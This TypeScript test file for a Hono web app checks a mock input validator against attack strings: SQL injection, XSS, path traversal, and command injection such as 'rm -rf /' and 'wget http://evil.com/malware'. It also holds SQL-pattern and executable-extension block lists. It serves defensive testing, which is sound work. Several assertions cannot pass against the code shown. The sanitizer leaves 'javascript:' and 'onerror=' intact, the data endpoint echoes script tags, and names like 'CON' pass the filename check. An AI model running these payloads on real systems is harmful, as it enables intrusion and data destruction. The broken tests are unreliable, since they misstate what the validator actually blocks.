import { describe, it, expect, beforeEach } from 'vitest';
import { Hono } from 'hono';
import type { CloudflareEnv } from '../../src/types/env';

/**
 * Input Validation and Sanitization Security Tests
 * 
 * Tests comprehensive input validation security scenarios:
 * - SQL injection prevention
 * - XSS (Cross-Site Scripting) prevention
 * - Command injection prevention
 * - Path traversal prevention
 * - File upload validation
 * - JSON injection prevention
 * - Header injection prevention
 * - Parameter pollution attacks
 * - Buffer overflow prevention
 * - Unicode and encoding attacks
 */

const mockEnv: CloudflareEnv = {
  JWT_SECRET: 'test-secret-at-least-32-characters-long-for-security',
  API_KEY_SALT: 'test-api-key-salt-at-least-32-characters-long-for-security',
  AUTH_KV: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  SECURITY_CONFIG: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  SECURITY_EVENTS: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  SECURITY_METRICS: {
    get: async (key: string) => null,
    put: async (key: string, value: string, options?: any) => {},
    delete: async (key: string) => {},
    list: async (options?: any) => ({ keys: [], list_complete: true }),
  },
  DB: {
    prepare: (query: string) => ({
      bind: (...values: any[]) => ({
        first: async () => null,
        all: async () => ({ results: [] }),
        run: async () => ({ success: true, changes: 0 })
      })
    })
  } as any,
  FILE_STORAGE: {} as any,
  ANALYTICS: {} as any,
  ENVIRONMENT: 'test'
};

// Mock validation utilities
class InputValidator {
  static validateUsername(username: string): { valid: boolean; errors: string[] } {
    const errors: string[] = [];
    
    if (!username || username.trim().length === 0) {
      errors.push('Username is required');
    }
    
    if (username.length < 3) {
      errors.push('Username must be at least 3 characters');
    }
    
    if (username.length > 50) {
      errors.push('Username must be less than 50 characters');
    }
    
    if (!/^[a-zA-Z0-9_-]+$/.test(username)) {
      errors.push('Username contains invalid characters');
    }
    
    // Check for SQL injection patterns
    const sqlPatterns = [
      /['";]/,
      /union\s+select/i,
      /drop\s+table/i,
      /delete\s+from/i,
      /insert\s+into/i,
      /update\s+set/i,
      /--/,
      /\/\*/,
      /\*\//
    ];
    
    if (sqlPatterns.some(pattern => pattern.test(username))) {
      errors.push('Username contains prohibited patterns');
    }
    
    return { valid: errors.length === 0, errors };
  }
  
  static validateEmail(email: string): { valid: boolean; errors: string[] } {
    const errors: string[] = [];
    
    if (!email || email.trim().length === 0) {
      errors.push('Email is required');
    }
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      errors.push('Invalid email format');
    }
    
    if (email.length > 255) {
      errors.push('Email too long');
    }
    
    // Check for header injection
    if (/[\r\n]/.test(email)) {
      errors.push('Email contains invalid characters');
    }
    
    return { valid: errors.length === 0, errors };
  }
  
  static validateFilename(filename: string): { valid: boolean; errors: string[] } {
    const errors: string[] = [];
    
    if (!filename || filename.trim().length === 0) {
      errors.push('Filename is required');
    }
    
    if (filename.length > 255) {
      errors.push('Filename too long');
    }
    
    // Check for path traversal
    const pathTraversalPatterns = [
      /\.\./,
      /\//,
      /\\/,
      /:/,
      /\|/,
      /</,
      />/,
      /"/,
      /\*/,
      /\?/
    ];
    
    if (pathTraversalPatterns.some(pattern => pattern.test(filename))) {
      errors.push('Filename contains prohibited characters');
    }
    
    // Check for dangerous extensions
    const dangerousExtensions = [
      '.exe', '.bat', '.cmd', '.com', '.pif', '.scr', '.vbs', '.js', '.jar',
      '.app', '.deb', '.pkg', '.dmg', '.rpm', '.sh', '.php', '.asp', '.jsp'
    ];
    
    if (dangerousExtensions.some(ext => filename.toLowerCase().endsWith(ext))) {
      errors.push('File type not allowed');
    }
    
    return { valid: errors.length === 0, errors };
  }
  
  static sanitizeHtml(input: string): string {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  }
  
  static validateJson(input: string): { valid: boolean; errors: string[]; parsed?: any } {
    const errors: string[] = [];
    
    try {
      const parsed = JSON.parse(input);
      
      // Check for prototype pollution
      if (this.hasPrototypePollution(parsed)) {
        errors.push('JSON contains prototype pollution attempt');
      }
      
      // Check for deep nesting (DoS protection)
      if (this.getJsonDepth(parsed) > 10) {
        errors.push('JSON nesting too deep');
      }
      
      return { valid: errors.length === 0, errors, parsed };
    } catch (e) {
      errors.push('Invalid JSON format');
      return { valid: false, errors };
    }
  }
  
  private static hasPrototypePollution(obj: any): boolean {
    if (typeof obj !== 'object' || obj === null) return false;
    
    const dangerousKeys = ['__proto__', 'constructor', 'prototype'];
    
    for (const key in obj) {
      if (dangerousKeys.includes(key)) return true;
      if (typeof obj[key] === 'object' && this.hasPrototypePollution(obj[key])) {
        return true;
      }
    }
    
    return false;
  }
  
  private static getJsonDepth(obj: any, depth = 0): number {
    if (typeof obj !== 'object' || obj === null) return depth;
    
    let maxDepth = depth;
    for (const key in obj) {
      const childDepth = this.getJsonDepth(obj[key], depth + 1);
      maxDepth = Math.max(maxDepth, childDepth);
    }
    
    return maxDepth;
  }
}

describe('Input Validation and Sanitization Security Tests', () => {
  let app: Hono;

  beforeEach(() => {
    app = new Hono();

    // Add input validation middleware
    app.use('*', async (c, next) => {
      // Basic input size limits
      const contentLength = c.req.header('content-length');
      if (contentLength && parseInt(contentLength) > 10 * 1024 * 1024) { // 10MB limit
        return c.json({ error: 'Request too large' }, 413);
      }
      
      await next();
    });

    // Mock endpoints with validation
    app.post('/register', async (c) => {
      const body = await c.req.json();
      
      const usernameValidation = InputValidator.validateUsername(body.username);
      const emailValidation = InputValidator.validateEmail(body.email);
      
      if (!usernameValidation.valid || !emailValidation.valid) {
        return c.json({
          error: 'Validation failed',
          details: [...usernameValidation.errors, ...emailValidation.errors]
        }, 400);
      }
      
      return c.json({ success: true });
    });

    app.post('/upload', async (c) => {
      const body = await c.req.json();
      
      const filenameValidation = InputValidator.validateFilename(body.filename);
      
      if (!filenameValidation.valid) {
        return c.json({
          error: 'Invalid filename',
          details: filenameValidation.errors
        }, 400);
      }
      
      return c.json({ success: true });
    });

    app.post('/data', async (c) => {
      const body = await c.req.text();
      
      const jsonValidation = InputValidator.validateJson(body);
      
      if (!jsonValidation.valid) {
        return c.json({
          error: 'Invalid JSON',
          details: jsonValidation.errors
        }, 400);
      }
      
      return c.json({ success: true, data: jsonValidation.parsed });
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should block basic SQL injection attempts in username', async () => {
      const sqlInjectionAttempts = [
        "admin'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "admin' UNION SELECT * FROM passwords",
        "admin'; DELETE FROM users WHERE '1'='1",
        "admin' OR 1=1#",
        "admin') OR ('1'='1",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "admin' AND 1=(SELECT COUNT(*) FROM users)",
      ];

      for (const maliciousInput of sqlInjectionAttempts) {
        const res = await app.request('/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: maliciousInput,
            email: 'test@example.com'
          })
        });

        expect(res.status).toBe(400);
        const body = await res.json();
        expect(body.error).toBe('Validation failed');
      }
    });

    it('should block advanced SQL injection techniques', async () => {
      const advancedAttempts = [
        "admin' WAITFOR DELAY '00:00:05' --",
        "admin'; EXEC xp_cmdshell('dir'); --",
        "admin' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>64",
        "admin' OR (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'false' END)='true",
        "admin' UNION ALL SELECT NULL,NULL,NULL,version()--",
        "admin'; INSERT INTO users (username) VALUES ('hacker'); --",
      ];

      for (const attempt of advancedAttempts) {
        const res = await app.request('/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: attempt,
            email: 'test@example.com'
          })
        });

        expect(res.status).toBe(400);
      }
    });

    it('should handle SQL injection with encoding', async () => {
      const encodedAttempts = [
        'admin%27%20OR%20%271%27%3D%271', // admin' OR '1'='1
        'admin%27%3B%20DROP%20TABLE%20users%3B%20--', // admin'; DROP TABLE users; --
        'admin%5C%27%20OR%20%5C%271%5C%27%3D%5C%271', // admin\' OR \'1\'=\'1
      ];

      for (const attempt of encodedAttempts) {
        const decoded = decodeURIComponent(attempt);
        const res = await app.request('/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: decoded,
            email: 'test@example.com'
          })
        });

        expect(res.status).toBe(400);
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize HTML content', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<div onclick="alert(1)">click me</div>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
      ];

      for (const payload of xssPayloads) {
        const sanitized = InputValidator.sanitizeHtml(payload);
        
        // Should not contain executable script tags or event handlers
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toMatch(/javascript:/i);
        
        // Should contain escaped characters
        expect(sanitized).toMatch(/&[a-z]+;/);
      }
    });

    it('should handle complex XSS vectors', async () => {
      const complexPayloads = [
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>eval("ale"+"rt(1)")</script>',
        '<script>window["ale"+"rt"](1)</script>',
        '<script>setTimeout("alert(1)",1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</script><script>alert(1)</script>',
      ];

      for (const payload of complexPayloads) {
        const sanitized = InputValidator.sanitizeHtml(payload);
        expect(sanitized).not.toMatch(/<script.*?>.*?<\/script>/is);
        expect(sanitized).not.toMatch(/javascript:/i);
      }
    });

    it('should prevent DOM-based XSS in JSON responses', async () => {
      const xssJsonPayloads = [
        '{"name": "<script>alert(1)</script>"}',
        '{"callback": "javascript:alert(1)"}',
        '{"html": "<img src=x onerror=alert(1)>"}',
      ];

      for (const payload of xssJsonPayloads) {
        const res = await app.request('/data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload
        });

        expect(res.status).toBe(200);
        const response = await res.json();
        
        // Response should not contain executable script content
        const responseStr = JSON.stringify(response);
        expect(responseStr).not.toMatch(/<script/i);
        expect(responseStr).not.toMatch(/javascript:/i);
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should block directory traversal in filenames', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        './../../etc/shadow',
        'file.txt/../../../sensitive.txt',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      ];

      for (const filename of pathTraversalAttempts) {
        const res = await app.request('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename })
        });

        expect(res.status).toBe(400);
        const body = await res.json();
        expect(body.error).toBe('Invalid filename');
      }
    });

    it('should block null byte injection', async () => {
      const nullByteAttempts = [
        'legitimate.txt\x00malicious.exe',
        'safe.csv\x00../../../etc/passwd',
        'file.txt%00.exe',
        'document.pdf\u0000script.js',
      ];

      for (const filename of nullByteAttempts) {
        const res = await app.request('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename })
        });

        expect(res.status).toBe(400);
      }
    });

    it('should prevent Windows-specific path traversal', async () => {
      const windowsAttempts = [
        'C:\\Windows\\System32\\config\\SAM',
        'file.txt\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        'UNC\\\\server\\share\\file.txt',
        'file.txt|type C:\\Windows\\System32\\config\\SAM',
        'CON', 'PRN', 'AUX', 'NUL', // Windows reserved names
        'COM1', 'COM2', 'LPT1', 'LPT2',
      ];

      for (const filename of windowsAttempts) {
        const res = await app.request('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename })
        });

        expect(res.status).toBe(400);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should block command injection attempts', async () => {
      const commandInjectionAttempts = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | cat /etc/shadow',
        'file.txt `cat /etc/passwd`',
        'file.txt $(cat /etc/passwd)',
        'file.txt; wget http://evil.com/malware',
        'file.txt & ping evil.com',
        'file.txt || curl evil.com',
      ];

      for (const filename of commandInjectionAttempts) {
        const res = await app.request('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename })
        });

        expect(res.status).toBe(400);
      }
    });

    it('should handle encoded command injection', async () => {
      const encodedAttempts = [
        'file.txt%3B%20rm%20-rf%20%2F', // ; rm -rf /
        'file.txt%26%26%20cat%20%2Fetc%2Fpasswd', // && cat /etc/passwd
        'file.txt%7C%20cat%20%2Fetc%2Fshadow', // | cat /etc/shadow
      ];

      for (const filename of encodedAttempts) {
        const decoded = decodeURIComponent(filename);
        const res = await app.request('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename: decoded })
        });

        expect(res.status).toBe(400);
      }
    });
  });

  describe('JSON Injection Prevention', () => {
    it('should prevent prototype pollution', async () => {
      const prototypePollutionAttempts = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"prototype": {"isAdmin": true}}',
        '{"__proto__.isAdmin": true}',
        '{"user": {"__proto__": {"role": "admin"}}}',
      ];

      for (const payload of prototypePollutionAttempts) {
        const res = await app.request('/data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload
        });

        expect(res.status).toBe(400);
        const body = await res.json();
        expect(body.error).toBe('Invalid JSON');
        expect(body.details).toContain('JSON contains prototype pollution attempt');
      }
    });

    it('should prevent JSON bomb attacks', async () => {
      // Create deeply nested JSON
      let deepJson = '{"a":';
      for (let i = 0; i < 15; i++) {
        deepJson += '{"b":';
      }
      deepJson += '"value"';
      for (let i = 0; i < 15; i++) {
        deepJson += '}';
      }
      deepJson += '}';

      const res = await app.request('/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: deepJson
      });

      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.details).toContain('JSON nesting too deep');
    });

    it('should handle malformed JSON gracefully', async () => {
      const malformedJsonAttempts = [
        '{"unclosed": "string',
        '{"trailing": "comma",}',
        '{unquoted: "key"}',
        '{"function": function() { return 1; }}',
        '{"undefined": undefined}',
        '{"infinity": Infinity}',
      ];

      for (const payload of malformedJsonAttempts) {
        const res = await app.request('/data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload
        });

        expect(res.status).toBe(400);
        const body = await res.json();
        expect(body.error).toBe('Invalid JSON');
      }
    });
  });

  describe('Header Injection Prevention', () => {
    it('should prevent CRLF injection in email field', async () => {
      const crlfInjectionAttempts = [
        'user@example.com\r\nBcc: admin@evil.com',
        'user@example.com\nX-Injected: true',
        'user@example.com\r\n\r\n<script>alert(1)</script>',
        'user@example.com%0D%0ABcc: hacker@evil.com',
        'user@example.com\u000d\u000aX-Evil: true',
      ];

      for (const email of crlfInjectionAttempts) {
        const res = await app.request('/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: 'testuser',
            email
          })
        });

        expect(res.status).toBe(400);
        const body = await res.json();
        expect(body.details).toContain('Email contains invalid characters');
      }
    });

    it('should prevent response splitting attacks', async () => {
      const responseSplittingAttempts = [
        'test\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
        'test\nLocation: http://evil.com',
        'test\r\nSet-Cookie: admin=true',
      ];

      for (const input of responseSplittingAttempts) {
        const validation = InputValidator.validateUsername(input);
        expect(validation.valid).toBe(false);
      }
    });
  });

  describe('Parameter Pollution Attacks', () => {
    it('should handle duplicate parameters safely', async () => {
      // Test with duplicate JSON keys
      const duplicateKeyJson = '{"username": "user1", "username": "admin"}';
      
      const res = await app.request('/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: duplicateKeyJson
      });

      expect(res.status).toBe(200);
      const body = await res.json();
      
      // Should use the last value (standard JSON behavior)
      expect(body.data.username).toBe('admin');
    });

    it('should handle array parameter pollution', async () => {
      const arrayPollutionJson = '{"items": ["safe"], "items": ["malicious"]}';
      
      const res = await app.request('/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: arrayPollutionJson
      });

      expect(res.status).toBe(200);
      const body = await res.json();
      
      // Should handle consistently
      expect(Array.isArray(body.data.items)).toBe(true);
    });
  });

  describe('Buffer Overflow Prevention', () => {
    it('should reject excessively large inputs', async () => {
      const largeUsername = 'x'.repeat(10000);
      
      const res = await app.request('/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: largeUsername,
          email: 'test@example.com'
        })
      });

      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.details).toContain('Username must be less than 50 characters');
    });

    it('should reject oversized requests', async () => {
      const oversizedData = 'x'.repeat(11 * 1024 * 1024); // 11MB

      const res = await app.request('/data', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Content-Length': oversizedData.length.toString()
        },
        body: oversizedData
      });

      expect(res.status).toBe(413);
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    it('should handle unicode normalization attacks', async () => {
      const unicodeAttempts = [
        'admin\u0000', // Null byte
        'admin\uFEFF', // Zero-width no-break space
        'admin\u200B', // Zero-width space
        'admin\u180E', // Mongolian vowel separator
        'ådmin', // Look-alike characters
        'αdmin', // Greek alpha
      ];

      for (const username of unicodeAttempts) {
        const validation = InputValidator.validateUsername(username);
        
        if (username.includes('\u0000') || 
            username.includes('\uFEFF') || 
            username.includes('\u200B') ||
            username.includes('\u180E')) {
          expect(validation.valid).toBe(false);
        }
      }
    });

    it('should prevent UTF-8 overlong encoding', async () => {
      const overlongAttempts = [
        '%c0%af', // Overlong encoding of '/'
        '%e0%80%af', // Overlong encoding of '/'
        '%f0%80%80%af', // Overlong encoding of '/'
      ];

      for (const attempt of overlongAttempts) {
        const decoded = decodeURIComponent(attempt);
        const validation = InputValidator.validateFilename(decoded);
        expect(validation.valid).toBe(false);
      }
    });

    it('should handle emoji and special unicode correctly', async () => {
      const emojiAttempts = [
        '👤admin', // Emoji prefix
        'admin💀', // Emoji suffix
        'ad🚀min', // Emoji middle
        '🔥🔥🔥', // Only emojis
      ];

      for (const username of emojiAttempts) {
        const validation = InputValidator.validateUsername(username);
        // Should be invalid due to character restrictions
        expect(validation.valid).toBe(false);
        expect(validation.errors).toContain('Username contains invalid characters');
      }
    });
  });

  describe('File Type Validation', () => {
    it('should block dangerous file extensions', async () => {
      const dangerousFiles = [
        'malware.exe',
        'script.bat',
        'trojan.scr',
        'virus.com',
        'backdoor.pif',
        'payload.vbs',
        'shell.sh',
        'webshell.php',
        'exploit.asp',
        'malicious.jsp',
        'app.jar',
        'installer.deb',
        'package.pkg',
        'image.dmg',
      ];

      for (const filename of dangerousFiles) {
        const res = await app.request('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename })
        });

        expect(res.status).toBe(400);
        const body = await res.json();
        expect(body.details).toContain('File type not allowed');
      }
    });

    it('should allow safe file extensions', async () => {
      const safeFiles = [
        'document.txt',
        'data.csv',
        'image.jpg',
        'picture.png',
        'archive.zip',
        'spreadsheet.xlsx',
        'presentation.pdf',
      ];

      for (const filename of safeFiles) {
        const validation = InputValidator.validateFilename(filename);
        expect(validation.valid).toBe(true);
      }
    });

    it('should handle file extension case variations', async () => {
      const caseVariations = [
        'malware.EXE',
        'script.Bat',
        'trojan.ScR',
        'virus.COM',
        'shell.SH',
        'webshell.PHP',
      ];

      for (const filename of caseVariations) {
        const validation = InputValidator.validateFilename(filename);
        expect(validation.valid).toBe(false);
        expect(validation.errors).toContain('File type not allowed');
      }
    });
  });
});